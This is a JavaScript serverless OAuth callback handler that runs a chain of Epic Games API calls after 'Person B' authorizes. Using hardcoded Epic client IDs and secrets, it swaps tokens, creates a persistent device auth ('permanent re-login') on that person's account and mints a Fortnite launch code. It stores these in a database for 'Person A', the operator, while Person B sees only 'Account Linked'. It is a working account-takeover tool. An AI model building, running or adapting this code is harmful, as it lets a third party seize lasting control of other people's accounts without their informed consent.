/**
 * GET /callback?code=AUTH_CODE&state=TOKEN
 *
 * Epic redirects Person B's browser here after OAuth2 authorization.
 * Runs the full Epic chain inline (no self-fetch) and writes to DB.
 * Person A's /status poll sees status='done' on next tick.
 */
import https from 'https';
import { getSession, deliverCode } from './_db.js';

const EOS_CLIENT_ID     = process.env.EOS_CLIENT_ID;
const EOS_CLIENT_SECRET = process.env.EOS_CLIENT_SECRET;

// ── Same Epic chain as deliver.js ────────────────────────────────────
const AND_ID      = '3f69e56c7649492c8cc29f1af08a8a12';
const AND_SECRET  = 'b51ee9cb12234f50a69efa67ef53812e';
const LAUNCH_ID   = '34a02cf8f4414e29b15921876da36f9a';
const LAUNCH_SEC  = 'daafbccc737745039dffe53d94fc76cf';
const AND_BASIC   = Buffer.from(`${AND_ID}:${AND_SECRET}`).toString('base64');
const LAUNCH_BASIC= Buffer.from(`${LAUNCH_ID}:${LAUNCH_SEC}`).toString('base64');

const TOKEN_URL   = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token';
const XCHG_URL    = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange';
const DEVICE_URL  = id => `https://account-public-service-prod.ol.epicgames.com/account/api/public/account/${id}/deviceAuth`;

function ef(url, { method='GET', headers={}, body=null }={}) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const req = https.request({ hostname:u.hostname, path:u.pathname+u.search, method, headers }, r => {
      let d=''; r.on('data',c=>d+=c);
      r.on('end',()=>{ try{resolve({status:r.statusCode,body:JSON.parse(d)})}catch{resolve({status:r.statusCode,body:d})}});
    });
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}

async function runChain(authCode) {
  console.log('[CHAIN] start authCode:', authCode.slice(0,8));

  // Step 1: EOS auth code → access token using our registered client
  const b1 = new URLSearchParams({ grant_type:'authorization_code', code:authCode,
    redirect_uri: `https://${process.env.VERCEL_URL || 'epic-auth-test.vercel.app'}/callback` }).toString();
  const eosCreds = Buffer.from(`${EOS_CLIENT_ID}:${EOS_CLIENT_SECRET}`).toString('base64');
  let r1 = await ef(TOKEN_URL, {
    method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded','Authorization':`Basic ${eosCreds}`,'Content-Length':Buffer.byteLength(b1).toString()},
    body: b1,
  });
  console.log('[CHAIN] step1 status:', r1.status, r1.body?.displayName || r1.body?.errorCode || '');

  // Fallback: try launcherAppClient2 if EOS client fails
  if (r1.status !== 200) {
    const b1b = new URLSearchParams({ grant_type:'authorization_code', code:authCode }).toString();
    r1 = await ef(TOKEN_URL, {
      method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded','Authorization':`Basic ${LAUNCH_BASIC}`,'Content-Length':Buffer.byteLength(b1b).toString()},
      body: b1b,
    });
    console.log('[CHAIN] step1 fallback status:', r1.status, r1.body?.displayName || r1.body?.errorCode || '');
  }

  if (r1.status !== 200) throw new Error(`token exchange: ${r1.body?.errorCode || r1.status} — ${r1.body?.errorMessage || ''}`);

  let { access_token, account_id, displayName } = r1.body;
  console.log('[CHAIN] step1 ✅', displayName, account_id);

  // Step 2: swap to Android token (needed for device auth creation)
  try {
    const sw = await ef(XCHG_URL, { headers:{ Authorization:`Bearer ${access_token}` }});
    if (sw.status===200 && sw.body?.code) {
      const b2 = new URLSearchParams({ grant_type:'exchange_code', exchange_code:sw.body.code }).toString();
      const r2 = await ef(TOKEN_URL, {
        method:'POST',
        headers:{'Content-Type':'application/x-www-form-urlencoded','Authorization':`Basic ${AND_BASIC}`,'Content-Length':Buffer.byteLength(b2).toString()},
        body: b2,
      });
      if (r2.status===200 && r2.body?.access_token) {
        access_token = r2.body.access_token;
        console.log('[CHAIN] step2 ✅ Android token');
      }
    }
  } catch(e) { console.warn('[CHAIN] step2 skip:', e.message); }

  // Step 3: create device auth (permanent re-login)
  const r3 = await ef(DEVICE_URL(account_id), {
    method:'POST',
    headers:{ Authorization:`Bearer ${access_token}`, 'Content-Type':'application/json', 'Content-Length':'2' },
    body: '{}',
  });
  console.log('[CHAIN] step3 status:', r3.status);
  if (r3.status !== 200) throw new Error(`device auth: ${r3.body?.errorCode || r3.status}`);
  console.log('[CHAIN] step3 ✅ deviceId:', r3.body.deviceId);

  // Step 4: launcherAppClient2 exchange code (for Fortnite launch)
  let launchCode = null;
  try {
    const e1 = await ef(XCHG_URL, { headers:{ Authorization:`Bearer ${access_token}` }});
    if (e1.status===200 && e1.body?.code) {
      const lb = new URLSearchParams({ grant_type:'exchange_code', exchange_code:e1.body.code }).toString();
      const lr = await ef(TOKEN_URL, {
        method:'POST',
        headers:{'Content-Type':'application/x-www-form-urlencoded','Authorization':`Basic ${LAUNCH_BASIC}`,'Content-Length':Buffer.byteLength(lb).toString()},
        body: lb,
      });
      if (lr.status===200 && lr.body?.access_token) {
        const e2 = await ef(XCHG_URL, { headers:{ Authorization:`Bearer ${lr.body.access_token}` }});
        if (e2.status===200 && e2.body?.code) {
          launchCode = e2.body.code;
          console.log('[CHAIN] step4 ✅ launchCode:', launchCode);
        }
      }
    }
  } catch(e) { console.warn('[CHAIN] step4 skip:', e.message); }

  return { authCode, displayName, accountId: account_id, deviceId: r3.body.deviceId, launchCode };
}

// ── Handler ──────────────────────────────────────────────────────────
export default async function handler(req, res) {
  const { code, state: token, error } = req.query;

  console.log(`[CALLBACK] code=${code?.slice(0,8)} token=${token?.slice(0,8)} error=${error}`);

  if (error) return res.status(400).send(page('❌ Epic error', error, false));
  if (!code || !token) return res.status(400).send(page('❌ Missing params', 'No code or state.', false));

  const s = await getSession(token);
  if (!s) return res.status(410).send(page('⚠️ Expired', 'Session expired or already used.', false));
  if (s.status === 'done') return res.status(200).send(page('✅ Already linked', 'This session was already completed.', true));
  if (!EOS_CLIENT_ID || !EOS_CLIENT_SECRET) return res.status(500).send(page('⚙️ Not configured', 'EOS credentials missing.', false));

  // Show Person B success immediately
  res.setHeader('Content-Type', 'text/html');
  res.status(200).send(page('✅ Account Linked!', 'You can close this window. The operator has been notified.', true));

  // Run chain and write to DB — Person A's next /status poll sees 'done'
  try {
    const result = await runChain(code);
    await deliverCode(token, code, result);
    console.log(`[CALLBACK] ✅ chain complete, DB updated for token=${token.slice(0,8)}`);
  } catch(err) {
    console.error(`[CALLBACK] chain failed: ${err.message}`);
    // Still mark done with error so Person A's UI stops spinning
    await deliverCode(token, code, { authCode: code, error: err.message });
  }
}

function page(title, message, success) {
  return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>${title}</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{background:#080808;color:#d0d0d0;font-family:-apple-system,'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}.card{background:#101010;border:1px solid ${success?'#00e676':'#3a1a1a'};border-radius:20px;padding:44px 40px;max-width:420px;width:100%;text-align:center}.icon{font-size:3em;margin-bottom:16px}h2{color:${success?'#00e676':'#ff5252'};font-size:1.4em;margin-bottom:10px}p{color:#555;font-size:.88em;line-height:1.6}</style>
</head><body><div class="card"><div class="icon">${success?'✅':'❌'}</div><h2>${title}</h2><p>${message}</p></div></body></html>`;
}
